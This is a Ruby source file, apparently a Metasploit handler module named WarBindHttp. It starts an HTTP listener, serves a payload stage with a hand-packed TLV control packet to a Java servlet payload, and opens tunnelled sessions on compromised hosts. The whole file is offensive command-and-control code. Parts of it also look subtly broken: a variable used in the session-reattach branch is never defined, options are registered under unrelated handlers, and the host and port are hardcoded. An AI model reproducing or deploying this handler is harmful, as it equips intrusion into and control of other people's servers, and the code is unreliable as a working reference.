require 'rex/io/stream_abstraction'
require 'rex/sync/ref'

module Msf
module Handler

###
#
# This handler implements the HTTP tunneling interface to a servlet.
#
###
module WarBindHttp

	include Msf::Handler

	#
	# Returns the string representation of the handler type, in this case
	# 'war_bind_http'.
	#
	def self.handler_type
		return "war_bind_http"
	end

	#
	# Returns the connection-described general handler type, in this case
	# 'tunnel'.
	#
	def self.general_handler_type
		"tunnel"
	end
	
	#
	# Initializes the HTTP tunneling handler.
	#
	def initialize(info = {})
		super
		register_options(
			[
				OptString.new('SERVLETURI', [ true,  "The URI of the servlet to connect to.", ''])
			], Msf::Handler::ReverseTcp)

		register_advanced_options(
			[
				OptInt.new('SessionExpirationTimeout', [ false, 'The number of seconds before this session should be forcible shut down', (24*3600*7)]),
				OptInt.new('SessionCommunicationTimeout', [ false, 'The number of seconds of no activity before this session should be killed', 300])
			], Msf::Handler::ReverseHttps)
	end

	#
	# Toggle for IPv4 vs IPv6 mode
	#
	def ipv6
		self.refname.index('ipv6') ? true : false
	end
	
	#
	# Create a HTTP listener
	#
	def setup_handler

		comm = datastore['ReverseListenerComm']
		if (comm.to_s == "local")
			comm = ::Rex::Socket::Comm::Local
		else
			comm = nil
		end

		# Start the HTTPS server service on this host/port
		self.service = Rex::ServiceManager.start(Rex::Proto::Http::Server,
			4114,
			ipv6 ? '::' : '0.0.0.0',
			false,
			{
				'Msf'        => framework,
				'MsfExploit' => self,
			},
			comm
		)

		# Create a reference to ourselves
		obj = self

		# Add the new resource
		service.add_resource("/",
			'Proc' => Proc.new { |cli, req|
				on_request(cli, req, obj)
			},
			'VirtualDirectory' => true)

		self.conn_ids = []
		print_status("Started HTTP reverse handler on http://localhost:4114/")
	end

	#
	# Simply calls stop handler to ensure that things are cool.
	#
	def cleanup_handler
		stop_handler
	end

	#
	# Basically does nothing.  The service is already started and listening
	# during set up.
	#
	def start_handler
	end

	#
	# Removes the / handler, possibly stopping the service if no sessions are
	# active on sub-urls.
	#
	def stop_handler
		self.service.remove_resource("/") if self.service
	end

	attr_accessor :service # :nodoc:
	attr_accessor :conn_ids

protected

	#
	# Parses the HTTPS request
	#
	def on_request(cli, req, obj)
		sid  = nil
		resp = Rex::Proto::Http::Response.new

		print_status("#{cli.peerhost}:#{cli.peerport} Request received for #{req.relative_resource}...")

		lhost = "localhost"

		# Default to our own IP if the user specified 0.0.0.0 (pebkac avoidance)
		if lhost.empty? or lhost == '0.0.0.0'
			lhost = Rex::Socket.source_address(cli.peerhost)
		end
		
		lhost = "[#{lhost}]" if Rex::Socket.is_ipv6?(lhost)
		
		uri_match = req.relative_resource
		
		# Process the requested resource.
		case uri_match
			when /^\/INITJM/
				print_line("Java: #{req.relative_resource}")

				conn_id = "CONN_" + Rex::Text.rand_text_alphanumeric(16)
				url = "metasploit.PayloadTunnelServlet\x00"
				real_url = "http://localhost:4114/" + conn_id + "/\x00"

				print_line "Conn ID: #{conn_id}"

				blob = [conn_id.length].pack('n') + conn_id
				blob << obj.generate_stage

				# This is a TLV packet - I guess somewhere there should be API for building them
				# in Metasploit :-)
				packet = ""
				packet << ["core_switch_call\x00".length + 8, 0x10001].pack('NN') + "core_switch_call\x00"
				packet << [url.length+8, 0x1000a].pack('NN')+url
				packet << [12, 0x2000b, datastore['SessionExpirationTimeout'].to_i].pack('NNN')
				packet << [12, 0x20019, datastore['SessionCommunicationTimeout'].to_i].pack('NNN')
				blob << [packet.length+8, 0].pack('NN') + packet

				resp.body = blob
				conn_ids << conn_id

				# Short-circuit the payload's handle_connection processing for create_session
				create_session(cli, {
					:passive_dispatcher => obj.service,
					:conn_id            => conn_id,
					:url                => real_url,
					:expiration         => datastore['SessionExpirationTimeout'].to_i,
					:comm_timeout       => datastore['SessionCommunicationTimeout'].to_i,
					:ssl                => false
				})

			when /^\/(CONN_.*)\//
				resp.body = ""
				conn_id = $1
				print_line("Received poll from #{conn_id}")

				if not self.conn_ids.include?(conn_id)
					print_status("Incoming orphaned session #{conn_id}, reattaching...")
					conn_ids << conn_id

					# Short-circuit the payload's handle_connection processing for create_session
					create_session(cli, {
						:passive_dispatcher => obj.service,
						:conn_id            => conn_id,
						:url                => url,
						:expiration         => datastore['SessionExpirationTimeout'].to_i,
						:comm_timeout       => datastore['SessionCommunicationTimeout'].to_i,
						:ssl                => false
					})
				end
			else
				print_status("#{cli.peerhost}:#{cli.peerport} Unknown request to #{uri_match} #{req.inspect}...")
				resp.code    = 200
				resp.message = "OK"
				resp.body    = "<h3>No site configured at this address</h3>"
		end

		cli.send_response(resp) if (resp)

		# Force this socket to be closed
		obj.service.close_client( cli )
	end


end

end
end
